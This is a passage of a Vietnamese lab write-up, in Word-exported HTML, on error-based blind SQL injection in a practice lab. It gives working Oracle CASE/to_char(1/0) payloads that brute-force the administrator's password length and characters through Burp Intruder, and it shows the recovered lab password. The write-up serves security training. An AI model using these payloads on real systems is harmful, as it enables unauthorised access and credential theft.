+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:16.0pt;line-height:106%'>--:&nbsp;<span
+class=SpellE>B&#7845;t</span> <span class=SpellE>c&#7913;</span> <span
+class=SpellE>&#273;i&#7873;u</span> <span class=SpellE>gì</span> <span
+class=SpellE>sau</span> <span class=SpellE>&#273;ó</span> <span class=SpellE>&#273;&#432;&#7907;c</span>
+<span class=SpellE>coi</span> <span class=SpellE>là</span> <span class=SpellE>nh&#7853;n</span>
+<span class=SpellE>xét</span> <span class=SpellE>và</span> <span class=SpellE>b&#7883;</span>
+<span class=SpellE>b&#7887;</span> qua,&nbsp;<span class=SpellE>có</span> <span
+class=SpellE>kh&#7843;</span> <span class=SpellE>n&#259;ng</span> <span
+class=SpellE>b&#7887;</span> qua <span class=SpellE>các</span> <span
+class=SpellE>c&#417;</span> <span class=SpellE>ch&#7871;</span> <span
+class=SpellE>x&#7917;</span> <span class=SpellE>lý</span> <span class=SpellE>l&#7895;i</span>.<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>L&#432;u ý <span
+class=SpellE>r&#7857;ng</span> <span class=SpellE>câu</span> <span
+class=SpellE>l&#7879;nh</span> CASE <span class=SpellE>&#273;ã</span> <span
+class=SpellE>&#273;&#432;&#7907;c</span> <span class=SpellE>m&#7903;</span> <span
+class=SpellE>r&#7897;ng</span>: AND <span class=GramE>SUBSTR(</span>password,
+1, 1) &gt; ‘a’<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>Nh&#432; <span
+class=SpellE>v&#7853;y</span> <span class=SpellE>b&#7857;ng</span> <span
+class=SpellE>cách</span> <span class=SpellE>l&#7863;p</span> qua <span
+class=SpellE>t&#7915;ng</span> <span class=SpellE>ch&#7919;</span> <span
+class=SpellE>cái</span> <span class=SpellE>chúng</span> ta <span class=SpellE>có</span>
+<span class=SpellE>th&#7875;</span> <span class=SpellE>trích</span> <span
+class=SpellE>xu&#7845;t</span> <span class=SpellE>&#273;&#432;&#7907;c</span> <span
+class=SpellE>m&#7853;t</span> <span class=SpellE>kh&#7849;u</span> <span
+class=SpellE>b&#7857;ng</span> qua <span class=SpellE>câu</span> <span
+class=SpellE>l&#7879;nh</span> <span class=SpellE>truy</span> <span
+class=SpellE>v&#7851;n</span> <span class=SpellE>&#273;i&#7873;u</span> <span
+class=SpellE>ki&#7879;n</span> <span class=SpellE>tr&#7843;</span> <span
+class=SpellE>v&#7873;</span> <span class=SpellE>hi&#7875;n</span> <span
+class=SpellE>th&#7883;</span> <span class=SpellE>L&#7895;i</span> 500 Internal
+Server Error <span class=SpellE>là</span> <span class=SpellE>&#273;úng</span>.<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_15" o:spid="_x0000_i1036"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1353.75pt;height:572.25pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image030.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1805 height=763
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image031.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_15"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>Hãy</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>g&#7917;i</span> <span class=SpellE>nó</span> <span class=SpellE>&#273;&#7871;n</span>
+Intruder <span class=SpellE>&#273;&#7875;</span> <span class=SpellE>&#273;oán</span>
+password<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_16" o:spid="_x0000_i1035"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1358.25pt;height:574.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image032.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1811 height=766
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image033.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_16"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><b><span style='font-size:16.0pt;
+line-height:106%'>Trích</span></b></span><b><span style='font-size:16.0pt;
+line-height:106%'> <span class=SpellE>xu&#7845;t</span> <span class=SpellE>thông</span>
+tin <span class=SpellE>xác</span> <span class=SpellE>th&#7921;c</span>(password)</span></b><span
+style='font-size:16.0pt;line-height:106%'> <o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>T&#7845;t</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>nhiên</span>, <span class=SpellE>vi&#7879;c</span> <span
+class=SpellE>l&#7863;p</span> <span class=SpellE>l&#7841;i</span> <span
+class=SpellE>th&#7911;</span> <span class=SpellE>công</span> <span
+class=SpellE>t&#7845;t</span> <span class=SpellE>c&#7843;</span> <span
+class=SpellE>các</span> <span class=SpellE>ch&#7919;</span> <span class=SpellE>cái</span>
+<span class=SpellE>s&#7869;</span> <span class=SpellE>r&#7845;t</span> <span
+class=SpellE>t&#7889;n</span> <span class=SpellE>th&#7901;i</span> <span
+class=SpellE>gian</span>. <span class=SpellE>Vì</span> <span class=SpellE>v&#7853;y</span>,
+<span class=SpellE>&#273;ó</span> <span class=SpellE>là</span> <span
+class=SpellE>lúc</span> <span class=SpellE>chúng</span> ta <span class=SpellE>s&#7917;</span>
+<span class=SpellE>d&#7909;ng</span> <span class=SpellE>l&#7841;i</span> <span
+class=SpellE>s&#7913;c</span> <span class=SpellE>m&#7841;nh</span> <span
+class=SpellE>c&#7911;a</span> <span class=SpellE>công</span> <span
+class=SpellE>c&#7909;</span> <span class=SpellE>Intrucder</span><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>Thay <span
+class=SpellE>&#273;&#7893;i</span> <span class=SpellE>toán</span> <span
+class=SpellE>t&#7917;</span> logic &gt; <span class=SpellE>thành</span> = <span
+class=SpellE>trong</span> <span class=SpellE>yêu</span> <span class=SpellE>c&#7847;u</span>
+<span class=SpellE>tr&#432;&#7899;c</span> <span class=SpellE>&#273;ó</span> <span
+class=SpellE>và</span> <span class=SpellE>&#273;ánh</span> <span class=SpellE>d&#7845;u</span>
+‘a’ <span class=SpellE>làm</span> <span class=SpellE>v&#7883;</span> <span
+class=SpellE>trí</span> payload:<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;background:
+darkgray;mso-highlight:darkgray'>'+UNION+SELECT+CASE+WHEN+(username%3d'administrator'+AND+<span
+class=GramE>SUBSTR(</span>password,+1,+1)+<b><span style='color:red'>%3d</span></b><span
+style='color:red'>'$a$')+</span>THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--</span><span
+style='font-size:16.0pt;line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_17" o:spid="_x0000_i1034"
+ type="#_x0000_t75" style='width:1367.25pt;height:8in;visibility:visible;
+ mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image034.png"
+  o:title=""/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1823 height=768
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image035.png"
+v:shapes="Picture_x0020_17"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>Chuy&#7875;n</span></span><span style='font-size:16.0pt;line-height:106%'>
+<span class=SpellE>&#273;&#7871;n</span> Payloads <span class=SpellE>và</span> <span
+class=SpellE>t&#7841;o</span> <span class=SpellE>danh</span> <span
+class=SpellE>sách</span> <span class=SpellE>burte</span>-force: <span
+class=SpellE>s&#7889;</span> <span class=SpellE>t&#7915;</span> 0–9 <span
+class=SpellE>và</span> <span class=SpellE>t&#7915;</span> a <span class=SpellE>&#273;&#7871;n</span>
+z bao <span class=SpellE>g&#7891;m</span> <span class=SpellE>c&#7843;</span> <span
+class=SpellE>ch&#7919;</span> in <span class=SpellE>hoa</span>.<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_18" o:spid="_x0000_i1033"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1370.25pt;height:577.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image036.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1827 height=770
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image037.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_18"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>L&#7847;n</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>này</span> ta <span class=SpellE>s&#7869;</span> <span
+class=SpellE>l&#7845;y</span> <span class=SpellE>k&#7871;t</span> <span
+class=SpellE>qu&#7843;</span> <span class=SpellE>mã</span> status 500 <span
+class=SpellE>tr&#7843;</span> <span class=SpellE>v&#7873;</span> <span
+class=SpellE>là</span> <span class=SpellE>L&#7895;i</span> Internal Server
+Error<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_19" o:spid="_x0000_i1032"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1375.5pt;height:579pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image038.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1834 height=772
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image039.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_19"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>Nh&#432; <span
+class=SpellE>v&#7853;y</span> <span class=SpellE>ch&#7919;</span> <span
+class=SpellE>cái</span> <span class=SpellE>&#273;&#7847;u</span> <span
+class=SpellE>tiên</span> <span class=SpellE>c&#7911;a</span> <span
+class=SpellE>m&#7853;t</span> <span class=SpellE>kh&#7849;u</span> <span
+class=SpellE>là</span> g.<o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>Làm</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>th&#7871;</span> <span class=SpellE>nào</span> <span class=SpellE>&#273;&#7875;</span>
+<span class=SpellE>tìm</span> <span class=SpellE>các</span> <span class=SpellE>ch&#7919;</span>
+<span class=SpellE>cái</span> <span class=SpellE>còn</span> <span class=SpellE>l&#7841;i</span>?
+<span class=SpellE>Và</span> <span class=SpellE>có</span> bao <span
+class=SpellE>nhiêu</span>?<o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>&#272;&#7875;</span></span><span style='font-size:16.0pt;line-height:
+106%'> <span class=SpellE>có</span> <span class=SpellE>&#273;&#432;&#7907;c</span>
+<span class=SpellE>s&#7889;</span> <span class=SpellE>l&#432;&#7907;ng</span> <span
+class=SpellE>ch&#7919;</span> <span class=SpellE>cái</span>, <span
+class=SpellE>chúng</span> ta <span class=SpellE>có</span> <span class=SpellE>th&#7875;</span>
+<span class=SpellE>g&#7917;i</span> <span class=SpellE>l&#7841;i</span> <span
+class=SpellE>yêu</span> <span class=SpellE>c&#7847;u</span> <span class=SpellE>cho</span>
+intruder <span class=SpellE>nh&#432;ng</span> <span class=SpellE>s&#7917;a</span>
+<span class=SpellE>&#273;&#7893;i</span> <span class=SpellE>m&#7897;t</span> <span
+class=SpellE>chút</span><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;background:
+darkgray;mso-highlight:darkgray'>'+UNION+SELECT+CASE+WHEN+(username%3d'administrator'+AND+<span
+class=GramE>LENGTH(</span>password)+%3d<span style='color:red'>+$1$)+</span>THEN+to_char(1/0)+ELSE+NULL+END+FROM+user</span><span
+style='font-size:16.0pt;line-height:106%'>—<o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=GramE><span style='font-size:16.0pt;line-height:
+106%'>LENGTH(</span></span><span style='font-size:16.0pt;line-height:106%'>password)+%3d+$1$:&nbsp;<span
+class=SpellE>Ki&#7875;m</span> <span class=SpellE>tra</span> <span
+class=SpellE>xem</span> <span class=SpellE>&#273;&#7897;</span> <span
+class=SpellE>dài</span> <span class=SpellE>m&#7853;t</span> <span class=SpellE>kh&#7849;u</span>
+<span class=SpellE>và</span> set <span class=SpellE>v&#7883;</span> <span
+class=SpellE>trí</span> payload <span class=SpellE>t&#7841;i</span> <span
+class=SpellE>giá</span> <span class=SpellE>tr&#7883;</span> .$1$<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_20" o:spid="_x0000_i1031"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1380.75pt;height:582.75pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image040.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1841 height=777
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image041.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_20"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>Set payload <span
+class=SpellE>&#273;&#7875;</span> <span class=SpellE>burte</span>-force <span
+class=SpellE>t&#7915;</span> 1-100<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_21" o:spid="_x0000_i1030"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1383.75pt;height:584.25pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image042.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1845 height=779
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image043.jpg"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_21"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>K&#7871;t</span></span><span style='font-size:16.0pt;line-height:106%'> <span
+class=SpellE>qu&#7843;</span> <span class=SpellE>tr&#7843;</span> <span
+class=SpellE>v&#7873;</span> password <span class=SpellE>g&#7891;m</span> 20 <span
+class=SpellE>ký</span> <span class=SpellE>t&#7921;</span><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_22" o:spid="_x0000_i1029"
+ type="#_x0000_t75" style='width:1388.25pt;height:585pt;visibility:visible;
+ mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image044.png"
+  o:title=""/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1851 height=780
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image045.png"
+v:shapes="Picture_x0020_22"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>&#272;&#7875;</span></span><span style='font-size:16.0pt;line-height:
+106%'> <span class=SpellE>tìm</span> <span class=SpellE>ra</span> password, <span
+class=SpellE>ch&#7881;</span> <span class=SpellE>c&#7847;n</span> <span
+class=SpellE>l&#7863;p</span> <span class=SpellE>l&#7841;i</span> <span
+class=SpellE>các</span> <span class=SpellE>b&#432;&#7899;c</span> <span
+class=SpellE>v&#7899;i</span> <span class=SpellE>ch&#7919;</span> <span
+class=SpellE>cái</span> <span class=SpellE>&#273;&#7847;u</span> <span
+class=SpellE>tiên</span>. Nh&#432;ng <span class=SpellE>m&#7895;i</span> <span
+class=SpellE>l&#7847;n</span> <span class=SpellE>t&#259;ng</span> <span
+class=SpellE>tham</span> <span class=SpellE>s&#7889;</span> <span class=SpellE>b&#7855;t</span>
+<span class=SpellE>&#273;&#7847;u</span> <span class=SpellE>lên</span> 1:<o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=GramE><span style='font-size:16.0pt;line-height:
+106%'>SUBSTR(</span></span><i><span style='font-size:16.0pt;line-height:106%'>string</span></i><span
+style='font-size:16.0pt;line-height:106%'>, <i>start</i>, <i>length</i>)SUBSTR(<i>password</i>,
+1, 1)<o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=GramE><span style='font-size:16.0pt;line-height:
+106%'>SUBSTR(</span></span><i><span style='font-size:16.0pt;line-height:106%'>password</span></i><span
+style='font-size:16.0pt;line-height:106%'>, 2, 1)<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>……………………………………………………………………………………<o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=GramE><span style='font-size:16.0pt;line-height:
+106%'>SUBSTR(</span></span><i><span style='font-size:16.0pt;line-height:106%'>password</span></i><span
+style='font-size:16.0pt;line-height:106%'>, 20, 1)<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;background:
+darkgray;mso-highlight:darkgray'>'+UNION+SELECT+CASE+WHEN+(+username%3d'administrator'+AND+<span
+class=GramE>SUBSTR(</span>password,<span style='color:red'>2,1</span>)%3d+'§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users—</span><span
+style='font-size:16.0pt;line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_23" o:spid="_x0000_i1028"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1395.75pt;height:590.25pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image046.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1861 height=787
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image047.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_23"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>Chuy&#7875;n</span></span><span style='font-size:16.0pt;line-height:106%'>
+<span class=SpellE>&#273;&#7871;n</span> Payloads <span class=SpellE>và</span> <span
+class=SpellE>t&#7841;o</span> <span class=SpellE>danh</span> <span
+class=SpellE>sách</span> <span class=SpellE>burte</span>-force: <span
+class=SpellE>s&#7889;</span> <span class=SpellE>t&#7915;</span> 0–9 <span
+class=SpellE>và</span> <span class=SpellE>t&#7915;</span> a <span class=SpellE>&#273;&#7871;n</span>
+z bao <span class=SpellE>g&#7891;m</span> <span class=SpellE>c&#7843;</span> <span
+class=SpellE>ch&#7919;</span> in <span class=SpellE>hoa</span>.<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_24" o:spid="_x0000_i1027"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1399.5pt;height:592.5pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image048.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1866 height=790
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image049.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_24"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>Nh&#432; <span
+class=SpellE>v&#7853;y</span> <span class=SpellE>ký</span> <span class=SpellE>t&#7921;</span>
+<span class=SpellE>th&#7913;</span> 2 <span class=SpellE>c&#7911;a</span>
+password <span class=SpellE>là</span> a<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_25" o:spid="_x0000_i1026"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1413pt;height:597.75pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image050.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1884 height=797
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image051.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_25"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span class=SpellE><span style='font-size:16.0pt;line-height:
+106%'>T&#432;&#417;ng</span></span><span style='font-size:16.0pt;line-height:
+106%'> <span class=SpellE>t&#7921;</span> <span class=SpellE>nh&#432;</span> <span
+class=SpellE>v&#7853;y</span> <span class=SpellE>th&#7917;</span> 20 <span
+class=SpellE>l&#7847;n</span> <span class=SpellE>là</span> <span class=SpellE>tìm</span>
+<span class=SpellE>&#273;&#7911;</span> <span class=SpellE>chu&#7895;i</span>
+password:<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;color:red'>gas330kpkg3oaryq1lje<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'>&#272;&#259;ng
+<span class=SpellE>nh&#7853;p</span> administrator <span class=SpellE>v&#7899;i</span>
+password <span class=SpellE>trên</span> <span class=SpellE>và</span> <span
+class=SpellE>hoàn</span> <span class=SpellE>thành</span> <span class=SpellE>th&#7917;</span>
+<span class=SpellE>thách</span><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%;mso-no-proof:
+yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_1" o:spid="_x0000_i1025"
+ type="#_x0000_t75" alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+ style='width:1423.5pt;height:602.25pt;visibility:visible;mso-wrap-style:square'>
+ <v:imagedata src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image052.png"
+  o:title="A screenshot of a computer&#10;&#10;Description automatically generated"/>
+</v:shape><![endif]--><![if !vml]><img border=0 width=1898 height=803
+src="Lab11%20Blind%20SQL%20injection%20-%20Error%20SQL%20Injection_files/image053.png"
+alt="A screenshot of a computer&#10;&#10;Description automatically generated"
+v:shapes="Picture_x0020_1"><![endif]></span><span style='font-size:16.0pt;
+line-height:106%'><o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:16.0pt;line-height:106%'><o:p>&nbsp;</o:p></span></p>
+
+</div>
+
+</body>
+
+</html>
